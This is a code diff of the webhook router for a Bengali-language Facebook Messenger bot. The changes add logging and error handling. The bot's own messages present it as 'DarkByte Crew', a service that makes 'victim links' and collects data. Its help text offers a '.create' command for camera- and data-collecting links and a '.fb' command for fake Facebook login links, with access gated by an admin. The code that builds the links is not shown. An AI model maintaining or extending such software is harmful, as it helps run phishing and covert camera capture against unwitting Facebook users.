@@ -5,7 +5,6 @@ const router = express.Router();
 const { getConfig, sendMessage, getUserProfile } = require('../utils/helpers');
 const User = require('../models/User');
 
-// ===== কমান্ড রানার =====
 async function runCommand(senderId, command, args) {
     const cmdPath = path.join(__dirname, '../commands', `${command}.js`);
     if (fs.existsSync(cmdPath)) {
@@ -25,7 +24,6 @@ async function runCommand(senderId, command, args) {
     }
 }
 
-// ===== ওয়েবহুক ভেরিফিকেশন =====
 router.get('/webhook', (req, res) => {
     const mode = req.query['hub.mode'];
     const token = req.query['hub.verify_token'];
@@ -39,7 +37,9 @@ router.get('/webhook', (req, res) => {
     }).catch(() => res.sendStatus(403));
 });
 
-// ===== ইনকামিং মেসেজ =====
+// ================================================================
+// 🆕 webhook POST - এরর হ্যান্ডলিং বাড়ানো
+// ================================================================
 router.post('/webhook', async (req, res) => {
     const body = req.body;
     if (body.object !== 'page') return res.sendStatus(404);
@@ -52,11 +52,12 @@ router.post('/webhook', async (req, res) => {
             const senderId = event.sender.id;
             const text = event.message.text.trim();
 
-            // ইউজার খুঁজি বা তৈরি করি
+            console.log(`📩 মেসেজ পেয়েছি: ${senderId} -> "${text}"`);
+
+            // ইউজার খুঁজি
             let user = await User.findOne({ fbId: senderId });
 
             if (!user) {
-                // ইউজারের নাম সংগ্রহ করি
                 const profile = await getUserProfile(senderId);
                 const firstName = profile?.first_name || 'বন্ধু';
 
@@ -68,20 +69,26 @@ router.post('/webhook', async (req, res) => {
                 });
                 await user.save();
 
-                // প্রথম মেসেজ
                 const introMsg = `আসসালামু আলাইকুম ${firstName}, 👋\n\nআমি **DarkByte Crew** বট, আমি ভিক্টিম লিংক তৈরি ও ডেটা কালেক্ট করতে পারি।\n\nআপনি আমাকে ব্যবহার করতে চাইলে অ্যাডমিন এর থেকে অনুমতি নিন:\n🔗 https://facebook.com/2ndJohnnySins`;
-                await sendMessage(senderId, introMsg);
+                
+                const result = await sendMessage(senderId, introMsg);
+                if (!result.success) {
+                    console.error(`❌ প্রথম মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
+                }
                 continue;
             }
 
-            // লাস্ট সিন আপডেট
             user.lastSeen = new Date();
             user.messageCount = (user.messageCount || 0) + 1;
             await user.save();
 
             // অনুমতি চেক
             if (!user.allowed) {
-                await sendMessage(senderId, '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins');
+                const msg = '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins';
+                const result = await sendMessage(senderId, msg);
+                if (!result.success) {
+                    console.error(`❌ অনুমতি মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
+                }
                 continue;
             }
 
@@ -93,12 +100,15 @@ router.post('/webhook', async (req, res) => {
                 await runCommand(senderId, command, args);
             } else {
                 const msg = `📌 সঠিক কমান্ড দিন:\n\n🔹 \`.create\` - ক্যামেরা ও ডেটা কালেক্ট লিংক তৈরি\n🔹 \`.fb\` - ফেক ফেসবুক লগইন লিংক তৈরি\n\nআরও জানতে: https://facebook.com/2ndJohnnySins`;
-                await sendMessage(senderId, msg);
+                const result = await sendMessage(senderId, msg);
+                if (!result.success) {
+                    console.error(`❌ হেল্প মেসেজ পাঠাতে ব্যর্থ: ${result.error}`);
+                }
             }
         }
         res.status(200).send('EVENT_RECEIVED');
     } catch (err) {
-        console.error('Webhook error:', err);
+        console.error('❌ Webhook error:', err);
         res.status(500).send('Error');
     }
 });
